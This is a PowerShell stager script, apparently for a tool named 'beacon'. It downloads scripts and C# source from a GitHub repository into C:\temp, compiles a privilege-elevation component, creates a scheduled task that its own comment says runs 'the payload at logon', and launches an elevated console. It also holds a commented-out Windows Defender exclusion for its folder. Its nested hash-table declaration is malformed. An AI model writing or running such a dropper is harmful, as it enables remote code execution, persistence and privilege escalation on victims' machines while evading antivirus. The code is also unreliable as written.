# Create the necessary directories
$directories = @("C:\temp", "C:\temp\beacon", "C:\temp\beacon\elevate")
foreach ($dir in $directories) {
    if (-not (Test-Path $dir)) {
        try {
            mkdir $dir -ErrorAction Stop | Out-Null
        } catch {
            Write-Error "Failed to create directory $dir = $_"
            exit 1
        }
    }
}

# # Excludes file paths
# try {
#     Add-MpPreference -ExclusionPath "C:\temp" -ErrorAction Stop
# } catch {
#     Write-Error "Failed to add exclusion path: $_"
#     exit 1
# }

# Download the necessary files
$files = @{
    $files = @{
        "https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/Source.cs" = "C:\temp\beacon\elevate\Source.cs";
        "https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/compile.ps1" = "C:\temp\beacon\elevate\compile.ps1";
        "https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/Elevate.ps1" = "C:\temp\beacon\elevate\Elevate.ps1";
        "https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/elevinit.ps1" = "C:\temp\beacon\elevate\elevinit.ps1";
        "https://raw.githubusercontent.com/snackmasta/beacon/master/run.ps1" = "C:\temp\beacon\run.ps1";
        "https://raw.githubusercontent.com/snackmasta/beacon/master/newprocess.ps1" = "C:\temp\beacon\newprocess.ps1";
        "https://raw.githubusercontent.com/snackmasta/beacon/master/GetState.ps1" = "C:\temp\beacon\GetState.ps1";
        "https://raw.githubusercontent.com/snackmasta/beacon/master/task.ps1" = "C:\temp\beacon\task.ps1";
        "https://raw.githubusercontent.com/snackmasta/beacon/master/TCPState.ps1" = "C:\temp\beacon\TCPState.ps1";
    }

}

foreach ($url in $files.Keys) {
    try {
        Invoke-Restmethod -Uri $url -OutFile $files[$url] -ErrorAction Stop
    } catch {
        Write-Error "Failed to download $url = $_"
        exit 1
    }
}

# Compile the C# source code into a DLL
try {
    & "C:\temp\beacon\elevate\compile.ps1" -ErrorAction Stop
} catch {
    Write-Error "Failed to compile source code: $_"
    exit 1
}

# Create a scheduled task to run the payload at logon
try {
    & "C:\temp\beacon\task.ps1" -ErrorAction Stop
} catch {
    Write-Error "Failed to create scheduled task: $_"
    exit 1
}

# Execute the elevated console
try {
    & "C:\temp\beacon\elevate\Elevate.ps1" -ErrorAction Stop
} catch {
    Write-Error "Failed to execute elevated console: $_"
    exit 1
}